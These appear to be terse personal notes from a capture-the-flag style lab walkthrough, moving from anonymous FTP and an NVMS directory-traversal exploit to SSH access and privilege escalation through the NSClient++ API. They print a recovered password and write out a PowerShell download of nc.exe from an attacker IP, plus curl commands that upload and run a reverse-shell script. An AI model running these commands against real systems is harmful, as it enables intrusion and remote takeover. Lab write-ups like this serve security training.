- nmap said ftp had anon login 
- so got in and found two directories Nadine and Nathan
- Nathan had a file that said a file of passwords were in his desktop
- used directory traversal exploit in nvms (its in exploit.py) to get password file from his desktop
- out of them one of them were Nadines ssh pass thats the Likesbig one
- went on to ssh and got user
- there is an nsclient++ thingy running that has an exploit
- got its password from C:\Program Files\NSClient++\nsclient.ini (it was ew2x6SsGTxjRwXOT)
- gui is shit and only allows authentication attempt from localhost
- nsclient has an api
- downloaded nc and reverse shell sript using something like powershell  wget "http://10.10.15.216:8080/nc.exe" -outfile "c:\Temp\nc.exe"
- could upload a script to service using curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/lol.bat --data-binary "C:\Temp\shell.bat"
- then could call lol variable to execute script using curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/lol/commands/execute
- caught reverse shell and got root
